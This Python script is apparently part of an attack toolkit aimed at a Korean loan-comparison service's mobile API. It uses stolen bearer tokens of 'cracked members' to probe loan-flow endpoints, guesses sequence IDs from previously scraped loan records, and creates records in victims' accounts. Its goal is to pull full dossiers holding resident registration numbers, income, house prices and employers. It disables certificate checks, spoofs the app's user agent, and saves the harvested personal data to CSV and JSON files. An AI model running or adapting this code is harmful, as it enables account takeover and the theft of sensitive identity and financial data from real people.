#!/usr/bin/env python3
"""Flow digger: find each cracked member's bigyoLoanFlwSeq so
getBigyoLoanFlw hands back the full dossier (rrNo, annualIncom, housePrice…).

Spec intel:
  POST /bigyo/api/bigyo/getBigyoLoanFlw?flowType=X   body BigyoLoanFlwParamDTO
       -> DataResponse<BigyoLoanFlwResultDTO>: rrNo, mobile, name, requestDt,
          annualIncom, housePrice, companyName, loanAmount, …
  POST /bigyo/api/bigyo/bigyoLoanFlw                  (이어하기 추가)
       body BigyoLoanFlwParamDTO -> generic object (likely the new seq)

Per cracked member:
  1. no-seq probes: flowType x {bare, memberSeq injected} — maybe the server
     resolves the member's latest flow from the JWT/session alone.
  2. loReqtNo values from loans_raw/<mob>.json tried AS the seq (systems often
     share one sequence space).
  3. one guarded ADD (bigyoLoanFlw) to learn the seq-allocation shape.

Outputs: flow_hits.csv (hits only), flow_dig_log.jsonl (journal),
flow_seqs.json (confirmed seqs, consumed by walkers later).
"""
import json
import os
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request

import tokstore

HERE = os.path.dirname(os.path.abspath(__file__))
BASE = "https://m.okbigyo.com:9443"
FLOW_TYPES = ("CREDIT", "COMBINE", "MORTGAGE", "ETC", "REHAB_ONE")
PACE = 0.3
MAX_REQ_PER_MEMBER = 20
ADD_DONE = os.path.join(HERE, "flow_add_done.json")
SEQS_FILE = os.path.join(HERE, "flow_seqs.json")
HITS_CSV = os.path.join(HERE, "flow_hits.csv")
LOG = os.path.join(HERE, "flow_dig_log.jsonl")

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
UA = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/126 Mobile Safari/537.36/OkBigyo_Android_Mobile/GA_Android"


def post(token, path, body=None):
    url = BASE + path
    data = json.dumps(body or {}).encode()
    req = urllib.request.Request(url, data=data, headers={
        "User-Agent": UA, "Content-Type": "application/json",
        "Accept": "*/*", "Authorization": "Bearer " + token})
    try:
        with urllib.request.urlopen(req, timeout=15, context=CTX) as r:
            raw = r.read().decode("utf-8", "replace")
            try:
                return r.status, json.loads(raw)
            except Exception:
                return r.status, {"raw": raw[:400]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            return e.code, json.loads(raw)
        except Exception:
            return e.code, {"raw": raw[:400]}
    except Exception as e:
        return 0, {"error": repr(e)[:200]}


def journal(line):
    with open(LOG, "a") as f:
        f.write(json.dumps(line, ensure_ascii=False) + "\n")


def hit_data(doc):
    if not isinstance(doc, dict):
        return None
    d = doc.get("data")
    if isinstance(d, dict) and any(v not in (None, "", [], {}) for v in d.values()):
        return d
    return None


def load_member_seq(mob):
    fp = os.path.join(HERE, "loans_raw", mob.replace("-", "_") + ".json")
    if not os.path.exists(fp):
        return None, []
    try:
        raw = json.load(open(fp))
    except Exception:
        return None, []
    mi = raw.get("myinfo") or {}
    data = mi.get("data") if isinstance(mi, dict) else None
    seq = data.get("memberSeq") if isinstance(data, dict) else None
    loans = raw.get("loans") or {}
    lst = loans.get("data") if isinstance(loans, dict) else (loans if isinstance(loans, list) else None)
    lreq = []
    if isinstance(lst, list):
        for it in lst:
            v = it.get("loReqtNo")
            if v:
                lreq.append(str(v))
    return seq, lreq


def csv_write(row):
    cols = ["ts", "mobile", "name", "kind", "flowType", "body", "data"]
    new = not os.path.exists(HITS_CSV)
    with open(HITS_CSV, "a", newline="") as f:
        import csv
        w = csv.writer(f)
        if new:
            w.writerow(cols)
        w.writerow(row)


def main():
    creds = tokstore.load()
    if not creds:
        print("FLOWDIG no cracked members")
        return
    seqs = {}
    if os.path.exists(SEQS_FILE):
        try:
            seqs = json.load(open(SEQS_FILE))
        except Exception:
            seqs = {}
    add_done = {}
    if os.path.exists(ADD_DONE):
        try:
            add_done = json.load(open(ADD_DONE))
        except Exception:
            add_done = {}

    for cr in creds:
        mob, name, tok = cr["mobile"], cr.get("name", ""), cr["token"]
        mseq, lreqs = load_member_seq(mob)
        print(f">>> FLOWDIG {mob} {name} memberSeq={mseq} loReqtNos={lreqs}", flush=True)
        reqs = 0

        def probe(kind, flow, body):
            nonlocal reqs
            if reqs >= MAX_REQ_PER_MEMBER:
                return
            reqs += 1
            st, doc = post(tok, f"/bigyo/api/bigyo/getBigyoLoanFlw?flowType={flow}", body)
            d = hit_data(doc)
            journal({"ts": time.strftime("%FT%TZ", time.gmtime()), "mobile": mob,
                     "kind": kind, "flowType": flow, "body": body,
                     "status": st, "hit": bool(d)})
            if d:
                seq_val = d.get("bigyoLoanFlwSeq")
                if seq_val:
                    seqs[mob] = str(seq_val)
                csv_write([time.strftime("%FT%TZ", time.gmtime()), mob, name,
                           kind, flow, json.dumps(body, ensure_ascii=False),
                           json.dumps(d, ensure_ascii=False)])
                print(f"HIT {kind}/{flow} seq={seq_val}", flush=True)
            time.sleep(PACE)

        # 1. no-seq resolution probes
        for ft in FLOW_TYPES:
            probe("noseq", ft, {"applyType": "EXISTING", "step": "1"})
            if mseq:
                probe("noseq_mseq", ft, {"applyType": "EXISTING", "step": "1", "memberSeq": int(mseq)})

        # 2. loReqtNo as seq
        for lr in lreqs[:3]:
            probe("lreq_as_seq", "CREDIT", {"bigyoLoanFlwSeq": lr, "applyType": "EXISTING", "step": "1"})

        # 3. one guarded add to learn seq allocation
        if mob not in add_done and reqs < MAX_REQ_PER_MEMBER:
            reqs += 1
            body = {"flowType": "CREDIT", "applyType": "NEW", "step": "1",
                    "memberSeq": int(mseq) if mseq else None,
                    "carNo": "00하0000", "annualIncom": "0"}
            st, doc = post(tok, "/bigyo/api/bigyo/bigyoLoanFlw", body)
            add_done[mob] = {"ts": time.strftime("%FT%TZ", time.gmtime()),
                             "status": st, "resp": doc if isinstance(doc, dict) else str(doc)[:300]}
            journal(add_done[mob] | {"mobile": mob, "kind": "add"})
            print(f"ADD {mob} -> {st} {json.dumps(doc, ensure_ascii=False)[:200]}", flush=True)
            if isinstance(doc, dict):
                cand = doc.get("data")
                if isinstance(cand, dict) and cand.get("bigyoLoanFlwSeq"):
                    seqs[mob] = str(cand["bigyoLoanFlwSeq"])
                elif isinstance(cand, (int, str)):
                    seqs[mob] = str(cand)
            time.sleep(PACE)

    with open(SEQS_FILE, "w") as f:
        json.dump(seqs, f, indent=1)
    with open(ADD_DONE, "w") as f:
        json.dump(add_done, f, indent=1)
    print(f"FLOWDIG DONE seqs={seqs}", flush=True)


if __name__ == "__main__":
    main()
